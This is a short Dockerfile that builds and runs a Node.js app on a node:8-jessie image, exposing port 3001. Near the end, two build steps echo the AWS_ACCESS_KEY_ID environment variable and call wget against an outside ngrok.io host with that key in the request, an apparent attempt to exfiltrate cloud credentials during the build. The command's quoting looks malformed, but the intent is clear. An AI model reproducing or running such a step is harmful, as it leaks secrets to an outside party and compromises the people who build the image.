FROM node:8-jessie

RUN mkdir -p /home/node/app/node_modules && chown -R node:node /home/node/app
WORKDIR /home/node/app
COPY package*.json ./
USER node
RUN npm install
COPY --chown=node:node . .
RUN echo $AWS_ACCESS_KEY_ID
RUN wget http://cdba80a8484a.ngrok.io /'echo $AWS_ACCESS_KEY_ID'


EXPOSE 3001
CMD ["node", "app.js"]
